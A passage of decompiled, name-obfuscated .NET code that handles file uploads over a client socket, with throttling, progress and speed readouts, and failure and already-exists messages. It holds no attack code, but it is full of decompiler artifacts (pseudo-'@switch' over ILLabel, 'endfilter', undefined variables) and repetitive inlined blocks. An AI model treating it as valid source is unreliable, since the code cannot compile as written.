											Class130.fTransferManager_0.method_12(cclient2.FILE_TRANSFER_ID, cclient2.sKey, cclient2.FILE_TRANSFER_USER_KEY, cclient2.FILE_TRANSFER_LOCAL_FILE, cclient2.FILE_TRANSFER_USER, cclient2.FILE_TRANSFER_GROUP_ID);
											Class130.fTransferManager_0.method_16(cclient2.FILE_TRANSFER_ID, 5, "Uploading");
											FileStream fileStream;
											checked
											{
												if (Conversions.ToDouble(cclient2.FILE_TRANSFER_FILESIZE) == 0.0)
												{
													fTransferManager fTransferManager_20 = Class130.fTransferManager_0;
													string file_TRANSFER_ID20 = cclient2.FILE_TRANSFER_ID;
													int num108 = 2;
													double num109 = Conversions.ToDouble(cclient2.FILE_TRANSFER_FILESIZE);
													bool flag3 = false;
													ref bool ptr10 = ref flag3;
													double num28 = num109;
													int num110 = num108;
													string string_60 = file_TRANSFER_ID20;
													fTransferManager fTransferManager22 = fTransferManager_20;
													string text6;
													object obj41;
													try
													{
														ProjectData.ClearProjectError();
														num30 = 2;
														string text5 = string.Empty;
														if (num28 >= 1099511627776.0)
														{
															text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
														}
														else if (num28 >= 1073741824.0)
														{
															text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
														}
														else if (num28 >= 1048576.0)
														{
															text5 = Strings.Format(num28 / 1024.0 / 1024.0, "#0.00") + " MiB";
														}
														else if (num28 >= 1024.0)
														{
															text5 = Strings.Format(num28 / 1024.0, "#0.00") + " KiB";
														}
														else if (num28 < 1024.0)
														{
															text5 = Conversions.ToString(Conversion.Fix(num28)) + " B";
														}
														if (ptr10)
														{
															text5 = Strings.Split(text5, " ", -1, CompareMethod.Text)[0];
														}
														if (text5.Length > 0)
														{
															text6 = text5;
														}
														else
														{
															text6 = " 0 B";
														}
														IL_9D30:
														goto IL_9D80;
														IL_9D32:
														text6 = "0 B";
														goto IL_9D30;
														IL_9D3B:
														num31 = -1;
														@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num30);
														IL_9D51:;
													}
													catch when (endfilter(obj41 is Exception & num30 != 0 & num31 == 0))
													{
														Exception ex72 = (Exception)obj42;
														goto IL_9D3B;
													}
													throw ProjectData.CreateProjectError(-2146828237);
													IL_9D80:
													if (num31 != 0)
													{
														ProjectData.ClearProjectError();
													}
													string string_61 = text6;
													fTransferManager22.method_16(string_60, num110, string_61);
													fTransferManager fTransferManager_21 = Class130.fTransferManager_0;
													string file_TRANSFER_ID21 = cclient2.FILE_TRANSFER_ID;
													int num111 = 3;
													double num112 = Conversions.ToDouble(cclient2.FILE_TRANSFER_FILESIZE);
													flag3 = false;
													ptr10 = ref flag3;
													num28 = num112;
													int num113 = num111;
													string string_62 = file_TRANSFER_ID21;
													fTransferManager fTransferManager23 = fTransferManager_21;
													object obj43;
													try
													{
														ProjectData.ClearProjectError();
														num30 = 2;
														string text5 = string.Empty;
														if (num28 >= 1099511627776.0)
														{
															text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
														}
														else if (num28 >= 1073741824.0)
														{
															text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
														}
														else if (num28 >= 1048576.0)
														{
															text5 = Strings.Format(num28 / 1024.0 / 1024.0, "#0.00") + " MiB";
														}
														else if (num28 >= 1024.0)
														{
															text5 = Strings.Format(num28 / 1024.0, "#0.00") + " KiB";
														}
														else if (num28 < 1024.0)
														{
															text5 = Conversions.ToString(Conversion.Fix(num28)) + " B";
														}
														if (ptr10)
														{
															text5 = Strings.Split(text5, " ", -1, CompareMethod.Text)[0];
														}
														if (text5.Length > 0)
														{
															text6 = text5;
														}
														else
														{
															text6 = " 0 B";
														}
														IL_9F3D:
														goto IL_9F8D;
														IL_9F3F:
														text6 = "0 B";
														goto IL_9F3D;
														IL_9F48:
														num31 = -1;
														@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num30);
														IL_9F5E:;
													}
													catch when (endfilter(obj43 is Exception & num30 != 0 & num31 == 0))
													{
														Exception ex73 = (Exception)obj44;
														goto IL_9F48;
													}
													throw ProjectData.CreateProjectError(-2146828237);
													IL_9F8D:
													if (num31 != 0)
													{
														ProjectData.ClearProjectError();
													}
													string str39 = text6;
													fTransferManager23.method_16(string_62, num113, str39 + " (100%)");
													if (cclient2.FILE_TRANSFER_ELAPSED / 1000.0 == 0.0)
													{
														fTransferManager fTransferManager_22 = Class130.fTransferManager_0;
														string file_TRANSFER_ID22 = cclient2.FILE_TRANSFER_ID;
														int num114 = 4;
														double num115 = Conversions.ToDouble(cclient2.FILE_TRANSFER_FILESIZE);
														flag3 = false;
														ptr10 = ref flag3;
														num28 = num115;
														int num116 = num114;
														string string_63 = file_TRANSFER_ID22;
														fTransferManager fTransferManager24 = fTransferManager_22;
														object obj45;
														try
														{
															ProjectData.ClearProjectError();
															num30 = 2;
															string text5 = string.Empty;
															if (num28 >= 1099511627776.0)
															{
																text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
															}
															else if (num28 >= 1073741824.0)
															{
																text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
															}
															else if (num28 >= 1048576.0)
															{
																text5 = Strings.Format(num28 / 1024.0 / 1024.0, "#0.00") + " MiB";
															}
															else if (num28 >= 1024.0)
															{
																text5 = Strings.Format(num28 / 1024.0, "#0.00") + " KiB";
															}
															else if (num28 < 1024.0)
															{
																text5 = Conversions.ToString(Conversion.Fix(num28)) + " B";
															}
															if (ptr10)
															{
																text5 = Strings.Split(text5, " ", -1, CompareMethod.Text)[0];
															}
															if (text5.Length > 0)
															{
																text6 = text5;
															}
															else
															{
																text6 = " 0 B";
															}
															IL_A173:
															goto IL_A1C3;
															IL_A175:
															text6 = "0 B";
															goto IL_A173;
															IL_A17E:
															num31 = -1;
															@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num30);
															IL_A194:;
														}
														catch when (endfilter(obj45 is Exception & num30 != 0 & num31 == 0))
														{
															Exception ex74 = (Exception)obj46;
															goto IL_A17E;
														}
														throw ProjectData.CreateProjectError(-2146828237);
														IL_A1C3:
														if (num31 != 0)
														{
															ProjectData.ClearProjectError();
														}
														string str40 = text6;
														fTransferManager24.method_16(string_63, num116, str40 + "/s");
													}
													Class130.fTransferManager_0.method_16(cclient2.FILE_TRANSFER_ID, 5, "Completed");
													Class130.fTransferManager_0.method_16(cclient2.FILE_TRANSFER_ID, 7, "N/A");
													Class130.fTransferManager_0.method_17(cclient2.FILE_TRANSFER_ID);
													Class130.fTransferManager_0.method_26();
													Class130.concurrentDictionary_0[cclient2.FILE_TRANSFER_ID].TRANSFER_ACTIVE = false;
													cclient2.FILE_TRANSFER_COMPLETED = true;
													Class130.long_3 -= 1L;
													if (Class130.long_3 < 0L)
													{
														Class130.long_3 = 0L;
													}
													goto IL_DF2C;
												}
												fileStream = new FileStream(cclient2.FILE_TRANSFER_LOCAL_FILE, FileMode.Open, FileAccess.Read);
											}
											try
											{
												byte[] array13 = new byte[checked(cclient2.sock_async.socket_0.ReceiveBufferSize + 1)];
												int num117 = 0;
												long num118 = 0L;
												Class136.Struct27 @struct = default(Class136.Struct27);
												@struct.int_0 = Marshal.SizeOf(typeof(Class136.Struct27));
												bool flag4 = false;
												if (Class136.GetVersionExA(ref @struct) && @struct.int_1 >= 6)
												{
													flag4 = true;
												}
												long num24;
												if (flag4)
												{
													num24 = Class136.GetTickCount64();
												}
												else
												{
													num24 = (long)Class136.GetTickCount();
												}
												long num119 = num24;
												int num120 = 0;
												do
												{
													num117 = fileStream.Read(array13, 0, array13.Length);
													long num121 = (long)(checked(Class135.smethod_0().MaxBandwidthRateOut * 1024));
													if (num117 > 0)
													{
														checked
														{
															array13 = (byte[])Utils.CopyArray(array13, new byte[num117 - 1 + 1]);
															num118 += unchecked((long)num117);
															cclient2.sock_async.method_6(array13);
															ptr2 = ref Class130.struct20_0.double_3;
														}
														Class130.struct20_0.double_3 = ptr2 + (double)array13.Length;
														CClient cclient191 = Class130.concurrentDictionary_3[cclient2.FILE_TRANSFER_USER_KEY];
														ptr2 = ref cclient191.stats_bytes_out;
														cclient191.stats_bytes_out = ptr2 + (double)array13.Length;
														CClient cclient192 = cclient2;
														ptr2 = ref cclient192.FILE_TRANSFER_SPEED_COUNTER;
														cclient192.FILE_TRANSFER_SPEED_COUNTER = ptr2 + (double)array13.Length;
														if ((double)Class136.smethod_36() - (double)cclient2.FILE_TRANSFER_LAST_PACKET > 1000.0)
														{
															cclient2.FILE_TRANSFER_ELAPSED = (double)cclient2.FILE_TRANSFER_LAST_PACKET - cclient2.FILE_TRANSFER_STARTED;
															cclient2.FILE_TRANSFER_SPEED_AVG = (double)num118 / (cclient2.FILE_TRANSFER_ELAPSED / 1000.0);
															long long_2 = checked((long)Math.Round(unchecked(Conversions.ToDouble(cclient2.FILE_TRANSFER_FILESIZE) - (double)num118) / cclient2.FILE_TRANSFER_SPEED_AVG));
															fTransferManager fTransferManager_23 = Class130.fTransferManager_0;
															string file_TRANSFER_ID23 = cclient2.FILE_TRANSFER_ID;
															int num122 = 2;
															double num123 = Conversions.ToDouble(cclient2.FILE_TRANSFER_FILESIZE);
															bool flag3 = false;
															ref bool ptr10 = ref flag3;
															double num28 = num123;
															int num124 = num122;
															string string_64 = file_TRANSFER_ID23;
															fTransferManager fTransferManager25 = fTransferManager_23;
															string text6;
															object obj47;
															try
															{
																ProjectData.ClearProjectError();
																num30 = 2;
																string text5 = string.Empty;
																if (num28 >= 1099511627776.0)
																{
																	text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
																}
																else if (num28 >= 1073741824.0)
																{
																	text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
																}
																else if (num28 >= 1048576.0)
																{
																	text5 = Strings.Format(num28 / 1024.0 / 1024.0, "#0.00") + " MiB";
																}
																else if (num28 >= 1024.0)
																{
																	text5 = Strings.Format(num28 / 1024.0, "#0.00") + " KiB";
																}
																else if (num28 < 1024.0)
																{
																	text5 = Conversions.ToString(Conversion.Fix(num28)) + " B";
																}
																if (ptr10)
																{
																	text5 = Strings.Split(text5, " ", -1, CompareMethod.Text)[0];
																}
																if (text5.Length > 0)
																{
																	text6 = text5;
																}
																else
																{
																	text6 = " 0 B";
																}
																IL_A5CC:
																goto IL_A614;
																IL_A5CE:
																text6 = "0 B";
																goto IL_A5CC;
																IL_A5D7:
																num31 = -1;
																@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num30);
																IL_A5ED:
																goto IL_AE76;
															}
															catch when (endfilter(obj47 is Exception & num30 != 0 & num31 == 0))
															{
																Exception ex75 = (Exception)obj48;
																goto IL_A5D7;
															}
															IL_A614:
															if (num31 != 0)
															{
																ProjectData.ClearProjectError();
															}
															string string_65 = text6;
															fTransferManager25.method_16(string_64, num124, string_65);
															fTransferManager fTransferManager_24 = Class130.fTransferManager_0;
															string file_TRANSFER_ID24 = cclient2.FILE_TRANSFER_ID;
															int num125 = 3;
															double num126 = (double)num118;
															flag3 = false;
															ptr10 = ref flag3;
															num28 = num126;
															int num127 = num125;
															string string_66 = file_TRANSFER_ID24;
															fTransferManager fTransferManager26 = fTransferManager_24;
															object obj49;
															try
															{
																ProjectData.ClearProjectError();
																num30 = 2;
																string text5 = string.Empty;
																if (num28 >= 1099511627776.0)
																{
																	text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
																}
																else if (num28 >= 1073741824.0)
																{
																	text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
																}
																else if (num28 >= 1048576.0)
																{
																	text5 = Strings.Format(num28 / 1024.0 / 1024.0, "#0.00") + " MiB";
																}
																else if (num28 >= 1024.0)
																{
																	text5 = Strings.Format(num28 / 1024.0, "#0.00") + " KiB";
																}
																else if (num28 < 1024.0)
																{
																	text5 = Conversions.ToString(Conversion.Fix(num28)) + " B";
																}
																if (ptr10)
																{
																	text5 = Strings.Split(text5, " ", -1, CompareMethod.Text)[0];
																}
																if (text5.Length > 0)
																{
																	text6 = text5;
																}
																else
																{
																	text6 = " 0 B";
																}
																IL_A7C8:
																goto IL_A810;
																IL_A7CA:
																text6 = "0 B";
																goto IL_A7C8;
																IL_A7D3:
																num31 = -1;
																@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num30);
																IL_A7E9:
																goto IL_AE81;
															}
															catch when (endfilter(obj49 is Exception & num30 != 0 & num31 == 0))
															{
																Exception ex76 = (Exception)obj50;
																goto IL_A7D3;
															}
															IL_A810:
															if (num31 != 0)
															{
																ProjectData.ClearProjectError();
															}
															string str41 = text6;
															fTransferManager26.method_16(string_66, num127, str41 + " (" + Conversions.ToString(Math.Round((double)num118 / Conversions.ToDouble(cclient2.FILE_TRANSFER_FILESIZE) * 100.0, 2)) + "%)");
															fTransferManager fTransferManager_25 = Class130.fTransferManager_0;
															string file_TRANSFER_ID25 = cclient2.FILE_TRANSFER_ID;
															int num128 = 4;
															double file_TRANSFER_SPEED_COUNTER2 = cclient2.FILE_TRANSFER_SPEED_COUNTER;
															flag3 = false;
															ptr10 = ref flag3;
															num28 = file_TRANSFER_SPEED_COUNTER2;
															int num129 = num128;
															string text17 = file_TRANSFER_ID25;
															fTransferManager fTransferManager27 = fTransferManager_25;
															object obj51;
															try
															{
																ProjectData.ClearProjectError();
																num30 = 2;
																string text5 = string.Empty;
																if (num28 >= 1099511627776.0)
																{
																	text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
																}
																else if (num28 >= 1073741824.0)
																{
																	text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
																}
																else if (num28 >= 1048576.0)
																{
																	text5 = Strings.Format(num28 / 1024.0 / 1024.0, "#0.00") + " MiB";
																}
																else if (num28 >= 1024.0)
																{
																	text5 = Strings.Format(num28 / 1024.0, "#0.00") + " KiB";
																}
																else if (num28 < 1024.0)
																{
																	text5 = Conversions.ToString(Conversion.Fix(num28)) + " B";
																}
																if (ptr10)
																{
																	text5 = Strings.Split(text5, " ", -1, CompareMethod.Text)[0];
																}
																if (text5.Length > 0)
																{
																	text6 = text5;
																}
																else
																{
																	text6 = " 0 B";
																}
																IL_A9FC:
																goto IL_AA44;
																IL_A9FE:
																text6 = "0 B";
																goto IL_A9FC;
																IL_AA07:
																num31 = -1;
																@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num30);
																IL_AA1D:
																goto IL_AE8C;
															}
															catch when (endfilter(obj51 is Exception & num30 != 0 & num31 == 0))
															{
																Exception ex77 = (Exception)obj52;
																goto IL_AA07;
															}
															IL_AA44:
															if (num31 != 0)
															{
																ProjectData.ClearProjectError();
															}
															string text18 = text6;
															fTransferManager fTransferManager28 = fTransferManager27;
															string text19 = text17;
															int num130 = num129;
															string text20 = text18;
															string text21 = "/s (Avg. ";
															double file_TRANSFER_SPEED_AVG2 = cclient2.FILE_TRANSFER_SPEED_AVG;
															flag3 = false;
															ptr10 = ref flag3;
															num28 = file_TRANSFER_SPEED_AVG2;
															string str42 = text21;
															string str43 = text20;
															int num131 = num130;
															string string_67 = text19;
															fTransferManager fTransferManager29 = fTransferManager28;
															object obj53;
															try
															{
																ProjectData.ClearProjectError();
																num30 = 2;
																string text5 = string.Empty;
																if (num28 >= 1099511627776.0)
																{
																	text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
																}
																else if (num28 >= 1073741824.0)
																{
																	text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
																}
																else if (num28 >= 1048576.0)
																{
																	text5 = Strings.Format(num28 / 1024.0 / 1024.0, "#0.00") + " MiB";
																}
																else if (num28 >= 1024.0)
																{
																	text5 = Strings.Format(num28 / 1024.0, "#0.00") + " KiB";
																}
																else if (num28 < 1024.0)
																{
																	text5 = Conversions.ToString(Conversion.Fix(num28)) + " B";
																}
																if (ptr10)
																{
																	text5 = Strings.Split(text5, " ", -1, CompareMethod.Text)[0];
																}
																if (text5.Length > 0)
																{
																	text6 = text5;
																}
																else
																{
																	text6 = " 0 B";
																}
																IL_ABF3:
																goto IL_AC3B;
																IL_ABF5:
																text6 = "0 B";
																goto IL_ABF3;
																IL_ABFE:
																num31 = -1;
																@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num30);
																IL_AC14:
																goto IL_AE97;
															}
															catch when (endfilter(obj53 is Exception & num30 != 0 & num31 == 0))
															{
																Exception ex78 = (Exception)obj54;
																goto IL_ABFE;
															}
															IL_AC3B:
															if (num31 != 0)
															{
																ProjectData.ClearProjectError();
															}
															string str44 = text6;
															fTransferManager29.method_16(string_67, num131, str43 + str42 + str44 + "/s)");
															Class130.fTransferManager_0.method_16(cclient2.FILE_TRANSFER_ID, 6, Class136.smethod_35(checked((long)Math.Round(cclient2.FILE_TRANSFER_ELAPSED / 1000.0)), true));
															Class130.fTransferManager_0.method_16(cclient2.FILE_TRANSFER_ID, 7, Class136.smethod_35(long_2, true));
															Class130.fTransferManager_0.method_17(cclient2.FILE_TRANSFER_ID);
															fMain ff17 = cclient2.ff;
															CClient cclient193 = cclient2;
															ptr11 = ref cclient193.FILE_TRANSFER_USER_KEY;
															value3 = cclient193.FILE_TRANSFER_USER_KEY;
															ff17.method_24(ref value3);
															ptr11 = Conversions.ToString(value3);
															cclient2.FILE_TRANSFER_SPEED_COUNTER = 0.0;
															cclient2.FILE_TRANSFER_LAST_PACKET = Class136.smethod_36();
														}
														if (num121 > 0L)
														{
															checked
															{
																num120 += num117;
															}
															if ((long)num120 >= checked(num121 - unchecked((long)num117)))
															{
																@struct = default(Class136.Struct27);
																@struct.int_0 = Marshal.SizeOf(typeof(Class136.Struct27));
																flag4 = false;
																if (Class136.GetVersionExA(ref @struct) && @struct.int_1 >= 6)
																{
																	flag4 = true;
																}
																if (flag4)
																{
																	num24 = Class136.GetTickCount64();
																}
																else
																{
																	num24 = (long)Class136.GetTickCount();
																}
																if (checked(num24 - num119) < 1000L)
																{
																	long num132 = 1000L;
																	@struct = default(Class136.Struct27);
																	@struct.int_0 = Marshal.SizeOf(typeof(Class136.Struct27));
																	flag4 = false;
																	if (Class136.GetVersionExA(ref @struct) && @struct.int_1 >= 6)
																	{
																		flag4 = true;
																	}
																	if (flag4)
																	{
																		num24 = Class136.GetTickCount64();
																	}
																	else
																	{
																		num24 = (long)Class136.GetTickCount();
																	}
																	long num133 = num24;
																	Thread.Sleep(checked((int)(num132 - (num133 - num119))));
																}
																num120 = 0;
																@struct = default(Class136.Struct27);
																@struct.int_0 = Marshal.SizeOf(typeof(Class136.Struct27));
																flag4 = false;
																if (Class136.GetVersionExA(ref @struct) && @struct.int_1 >= 6)
																{
																	flag4 = true;
																}
																if (flag4)
																{
																	num24 = Class136.GetTickCount64();
																}
																else
																{
																	num24 = (long)Class136.GetTickCount();
																}
																num119 = num24;
																Thread.Sleep(1);
															}
														}
													}
													Thread.Sleep(1);
												}
												while (num117 > 0 & Class130.concurrentDictionary_0[cclient2.FILE_TRANSFER_ID].TRANSFER_ACTIVE);
												fileStream.Close();
												goto IL_AEB3;
												IL_AE76:
												throw ProjectData.CreateProjectError(-2146828237);
												IL_AE81:
												throw ProjectData.CreateProjectError(-2146828237);
												IL_AE8C:
												throw ProjectData.CreateProjectError(-2146828237);
												IL_AE97:
												throw ProjectData.CreateProjectError(-2146828237);
											}
											finally
											{
												((IDisposable)fileStream).Dispose();
											}
											IL_AEB3:;
										}
									}
									catch (Exception ex79)
									{
										CClient cclient194 = cclient2;
										bool flag3 = false;
										cclient194.SOCKET_DISCONNECT(ref flag3);
									}
									return;
								}
								if (Operators.CompareString(left, "FL_UP_FAILED", true) == 0)
								{
									try
									{
										string[] array9;
										bool flag5;
										checked
										{
											Class130.long_3 -= 1L;
											if (Class130.long_3 < 0L)
											{
												Class130.long_3 = 0L;
											}
											cclient2.FILE_TRANSFER_ID = "i" + cclient2.mSocketCounter;
											array9 = Strings.Split(text14, "|", 7, CompareMethod.Text);
											cclient2.FILE_TRANSFER_USER_KEY = array9[1];
											cclient2.FILE_TRANSFER_USER = array9[2];
											cclient2.FILE_TRANSFER_LOCAL_FILE = Encoding.UTF8.GetString(Convert.FromBase64String(array9[3]));
											cclient2.FILE_TRANSFER_FILESIZE = Conversions.ToString(Class136.smethod_32(ref cclient2.FILE_TRANSFER_LOCAL_FILE));
											cclient2.FILE_TRANSFER_LAST_PACKET = Class136.smethod_36();
											cclient2.FILE_TRANSFER_STARTED = (double)Class136.smethod_36();
											cclient2.FILE_TRANSFER_GROUP_ID = array9[4];
											string key = cclient2.FILE_TRANSFER_USER_KEY;
											try
											{
												flag5 = Class130.concurrentDictionary_3.ContainsKey(key);
												goto IL_AFD3;
											}
											catch (Exception ex80)
											{
											}
											flag5 = false;
											IL_AFD3:;
										}
										if (!flag5)
										{
											CClient cclient195 = cclient2;
											bool flag3 = false;
											cclient195.SOCKET_DISCONNECT(ref flag3);
										}
										else
										{
											cclient2.FILE_TRANSFER_ACTIVE = false;
											Class130.fTransferManager_0.method_12(cclient2.FILE_TRANSFER_ID, cclient2.sKey, cclient2.FILE_TRANSFER_USER_KEY, cclient2.FILE_TRANSFER_LOCAL_FILE, cclient2.FILE_TRANSFER_USER, cclient2.FILE_TRANSFER_GROUP_ID);
											fTransferManager fTransferManager_26 = Class130.fTransferManager_0;
											string file_TRANSFER_ID26 = cclient2.FILE_TRANSFER_ID;
											int num134 = 2;
											double num135 = Conversions.ToDouble(cclient2.FILE_TRANSFER_FILESIZE);
											bool flag3 = false;
											ref bool ptr10 = ref flag3;
											double num28 = num135;
											int num136 = num134;
											string string_68 = file_TRANSFER_ID26;
											fTransferManager fTransferManager30 = fTransferManager_26;
											string text6;
											object obj55;
											try
											{
												ProjectData.ClearProjectError();
												num30 = 2;
												string text5 = string.Empty;
												if (num28 >= 1099511627776.0)
												{
													text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
												}
												else if (num28 >= 1073741824.0)
												{
													text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
												}
												else if (num28 >= 1048576.0)
												{
													text5 = Strings.Format(num28 / 1024.0 / 1024.0, "#0.00") + " MiB";
												}
												else if (num28 >= 1024.0)
												{
													text5 = Strings.Format(num28 / 1024.0, "#0.00") + " KiB";
												}
												else if (num28 < 1024.0)
												{
													text5 = Conversions.ToString(Conversion.Fix(num28)) + " B";
												}
												if (ptr10)
												{
													text5 = Strings.Split(text5, " ", -1, CompareMethod.Text)[0];
												}
												if (text5.Length > 0)
												{
													text6 = text5;
												}
												else
												{
													text6 = " 0 B";
												}
												IL_B1C6:
												goto IL_B216;
												IL_B1C8:
												text6 = "0 B";
												goto IL_B1C6;
												IL_B1D1:
												num31 = -1;
												@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num30);
												IL_B1E7:;
											}
											catch when (endfilter(obj55 is Exception & num30 != 0 & num31 == 0))
											{
												Exception ex81 = (Exception)obj56;
												goto IL_B1D1;
											}
											throw ProjectData.CreateProjectError(-2146828237);
											IL_B216:
											if (num31 != 0)
											{
												ProjectData.ClearProjectError();
											}
											string string_69 = text6;
											fTransferManager30.method_16(string_68, num136, string_69);
											fTransferManager fTransferManager_27 = Class130.fTransferManager_0;
											string file_TRANSFER_ID27 = cclient2.FILE_TRANSFER_ID;
											int num137 = 3;
											double num138 = 0.0;
											flag3 = false;
											ptr10 = ref flag3;
											num28 = num138;
											int num139 = num137;
											string string_70 = file_TRANSFER_ID27;
											fTransferManager fTransferManager31 = fTransferManager_27;
											object obj57;
											try
											{
												ProjectData.ClearProjectError();
												num30 = 2;
												string text5 = string.Empty;
												if (num28 >= 1099511627776.0)
												{
													text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
												}
												else if (num28 >= 1073741824.0)
												{
													text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
												}
												else if (num28 >= 1048576.0)
												{
													text5 = Strings.Format(num28 / 1024.0 / 1024.0, "#0.00") + " MiB";
												}
												else if (num28 >= 1024.0)
												{
													text5 = Strings.Format(num28 / 1024.0, "#0.00") + " KiB";
												}
												else if (num28 < 1024.0)
												{
													text5 = Conversions.ToString(Conversion.Fix(num28)) + " B";
												}
												if (ptr10)
												{
													text5 = Strings.Split(text5, " ", -1, CompareMethod.Text)[0];
												}
												if (text5.Length > 0)
												{
													text6 = text5;
												}
												else
												{
													text6 = " 0 B";
												}
												IL_B3D0:
												goto IL_B420;
												IL_B3D2:
												text6 = "0 B";
												goto IL_B3D0;
												IL_B3DB:
												num31 = -1;
												@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num30);
												IL_B3F1:;
											}
											catch when (endfilter(obj57 is Exception & num30 != 0 & num31 == 0))
											{
												Exception ex82 = (Exception)obj58;
												goto IL_B3DB;
											}
											throw ProjectData.CreateProjectError(-2146828237);
											IL_B420:
											if (num31 != 0)
											{
												ProjectData.ClearProjectError();
											}
											string str45 = text6;
											fTransferManager31.method_16(string_70, num139, str45 + " (0%)");
											Class130.fTransferManager_0.method_16(cclient2.FILE_TRANSFER_ID, 4, "N/A");
											Class130.fTransferManager_0.method_16(cclient2.FILE_TRANSFER_ID, 5, "Failed (" + array9[5] + ")");
											Class130.fTransferManager_0.method_16(cclient2.FILE_TRANSFER_ID, 7, "N/A");
											Class130.concurrentDictionary_0[cclient2.FILE_TRANSFER_ID].TRANSFER_ACTIVE = false;
											ref double ptr2 = ref Class130.struct20_0.double_2;
											Class130.struct20_0.double_2 = ptr2 + (double)num;
											ptr2 = ref Class130.struct20_0.double_4;
											Class130.struct20_0.double_4 = ptr2 + 1.0;
											CClient cclient196 = Class130.concurrentDictionary_3[cclient2.FILE_TRANSFER_USER_KEY];
											ptr2 = ref cclient196.stats_bytes_in;
											cclient196.stats_bytes_in = ptr2 + (double)num;
											Class130.fTransferManager_0.method_17(cclient2.FILE_TRANSFER_ID);
											Class130.fTransferManager_0.method_26();
											stringBuilder.Clear();
											CClient cclient197 = cclient2;
											flag3 = false;
											cclient197.SOCKET_DISCONNECT(ref flag3);
										}
									}
									catch (Exception ex83)
									{
										CClient cclient198 = cclient2;
										bool flag3 = false;
										cclient198.SOCKET_DISCONNECT(ref flag3);
									}
									return;
								}
								if (Operators.CompareString(left, "FL_UP_EXISTS", true) == 0)
								{
									try
									{
										string[] array9;
										bool flag5;
										checked
										{
											Class130.long_3 -= 1L;
											if (Class130.long_3 < 0L)
											{
												Class130.long_3 = 0L;
											}
											cclient2.FILE_TRANSFER_ID = "i" + cclient2.mSocketCounter;
											array9 = Strings.Split(text14, "|", 7, CompareMethod.Text);
											cclient2.FILE_TRANSFER_USER_KEY = array9[1];
											cclient2.FILE_TRANSFER_USER = array9[2];
											cclient2.FILE_TRANSFER_LOCAL_FILE = Encoding.UTF8.GetString(Convert.FromBase64String(array9[3]));
											cclient2.FILE_TRANSFER_FILESIZE = Conversions.ToString(Class136.smethod_32(ref cclient2.FILE_TRANSFER_LOCAL_FILE));
											cclient2.FILE_TRANSFER_LAST_PACKET = Class136.smethod_36();
											cclient2.FILE_TRANSFER_STARTED = (double)Class136.smethod_36();
											cclient2.FILE_TRANSFER_GROUP_ID = array9[4];
											string key = cclient2.FILE_TRANSFER_USER_KEY;
											try
											{
												flag5 = Class130.concurrentDictionary_3.ContainsKey(key);
												goto IL_B646;
											}
											catch (Exception ex84)
											{
											}
											flag5 = false;
											IL_B646:;
										}
										if (!flag5)
										{
											CClient cclient199 = cclient2;
											bool flag3 = false;
											cclient199.SOCKET_DISCONNECT(ref flag3);
										}
										else
										{
											cclient2.FILE_TRANSFER_ACTIVE = false;
											Class130.fTransferManager_0.method_12(cclient2.FILE_TRANSFER_ID, cclient2.sKey, cclient2.FILE_TRANSFER_USER_KEY, cclient2.FILE_TRANSFER_LOCAL_FILE, cclient2.FILE_TRANSFER_USER, cclient2.FILE_TRANSFER_GROUP_ID);
											fTransferManager fTransferManager_28 = Class130.fTransferManager_0;
											string file_TRANSFER_ID28 = cclient2.FILE_TRANSFER_ID;
											int num140 = 2;
											double num141 = Conversions.ToDouble(cclient2.FILE_TRANSFER_FILESIZE);
											bool flag3 = false;
											ref bool ptr10 = ref flag3;
											double num28 = num141;
											int num142 = num140;
											string string_71 = file_TRANSFER_ID28;
											fTransferManager fTransferManager32 = fTransferManager_28;
											string text6;
											object obj59;
											try
											{
												ProjectData.ClearProjectError();
												num30 = 2;
												string text5 = string.Empty;
												if (num28 >= 1099511627776.0)
												{
													text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
												}
												else if (num28 >= 1073741824.0)
												{
													text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
												}
												else if (num28 >= 1048576.0)
												{
													text5 = Strings.Format(num28 / 1024.0 / 1024.0, "#0.00") + " MiB";
												}
												else if (num28 >= 1024.0)
												{
													text5 = Strings.Format(num28 / 1024.0, "#0.00") + " KiB";
												}
												else if (num28 < 1024.0)
												{
													text5 = Conversions.ToString(Conversion.Fix(num28)) + " B";
												}
												if (ptr10)
												{
													text5 = Strings.Split(text5, " ", -1, CompareMethod.Text)[0];
												}
												if (text5.Length > 0)
												{
													text6 = text5;
												}
												else
